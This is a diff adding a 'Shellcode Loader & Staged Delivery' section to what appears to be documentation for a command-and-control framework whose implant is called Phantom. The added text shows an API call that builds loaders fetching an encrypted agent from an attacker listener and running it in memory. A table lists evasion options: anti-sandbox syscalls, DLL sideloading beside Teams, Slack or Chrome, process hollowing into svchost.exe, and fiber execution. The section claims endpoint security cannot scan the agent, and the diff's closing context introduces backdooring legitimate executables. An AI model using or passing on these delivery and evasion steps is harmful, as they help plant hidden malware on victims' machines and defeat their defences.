@@ -613,6 +613,28 @@ proxychains curl http://10.10.20.30:8080
 
 ---
 
+## Shellcode Loader & Staged Delivery
+
+Generate tiny loaders (~30KB) that download and execute the agent entirely in-memory — nothing touches disk:
+
+```bash
+# From API:
+curl -X POST http://localhost:3000/api/payload/loader \
+  -H "Content-Type: application/json" \
+  -d '{"listener_url":"http://YOUR-IP:8080","loader_type":"syscall"}'
+```
+
+| Loader Type | Size | Description |
+|------------|------|-------------|
+| `syscall` | ~30KB | Direct API loader with anti-sandbox (most stealthy) |
+| `dll` | ~25KB | DLL sideload — rename to version.dll, place with Teams/Slack/Chrome |
+| `hollowing` | ~35KB | Process hollowing — injects into suspended svchost.exe |
+| `fiber` | ~28KB | Windows Fiber execution — avoids thread-based detection |
+
+**How it works:** C2 encrypts agent with AES-256 → tiny loader downloads encrypted blob → decrypts in-memory → executes. Agent never touches disk, EDR can't scan it.
+
+---
+
 ## Binary Backdooring
 
 Inject the Phantom agent into any legitimate executable:
